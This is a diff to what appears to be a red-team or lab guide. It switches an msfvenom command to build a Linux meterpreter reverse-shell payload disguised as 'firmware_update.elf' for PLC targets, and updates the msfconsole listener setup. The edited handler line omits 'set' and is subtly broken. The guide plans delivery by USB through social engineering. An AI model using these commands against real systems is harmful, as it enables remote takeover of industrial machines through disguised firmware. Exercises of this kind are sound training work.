@@ -17,7 +17,7 @@ The malicious program can be generated using **Metasploit**’s `msfvenom` tool.
 #### Command to Generate a Payload:
 
 ```
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.115 LPORT=4444 -f exe -o firmware_update.exe
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.0.115 LPORT=4444 -f elf -o firmware_update.elf
 ```
 
 - LHOST: IP address of the attacker's machine where the reverse shell will connect.
@@ -57,13 +57,17 @@ Test the payload to ensure it works as expected by running the PLC_Firmware_Upda
 ```
 msfconsole
 use exploit/multi/handler
-set payload windows/meterpreter/reverse_tcp
+payload linux/x86/meterpreter/reverse_tcp
 set LHOST 192.168.0.115
 set LPORT 4444
 exploit
 ```
+
+![](https://drive.google.com/uc?export=view&id=11_a6WHpQE2eY5qpEH0qKMKmtl_KOW0MT)
+
 When the payload is executed, the attacker will gain a reverse shell into the system.
 
+![](https://drive.google.com/uc?export=view&id=1sdt-z1I3P1AjoJnpeIBrIBQfXoRurdCe)
 ## Next Steps
 Once the malicious USB drive is prepared, it will be delivered to the target via social engineering in the Initial Access phase.
 
